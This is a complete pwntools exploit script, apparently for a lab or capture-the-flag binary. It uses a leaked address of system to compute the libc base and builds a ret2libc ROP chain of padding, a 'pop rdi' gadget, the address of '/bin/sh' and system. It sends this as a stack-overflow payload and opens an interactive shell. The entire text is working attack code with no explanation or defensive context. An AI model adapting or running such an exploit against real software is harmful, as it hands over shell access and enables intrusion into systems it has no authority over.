from pwn import *

io = process('./10_2_3_PIE_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.33.so')

system_addr = int(io.recvline(), 16)
libc_addr = system_addr - libc.sym['system']
bin_sh_addr = libc_addr + next(libc.search('/bin/sh'))
pop_rdi_addr = libc_addr + 0x0000000000027c3d

payload = b'A' * 136
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.send(payload)
io.interactive()
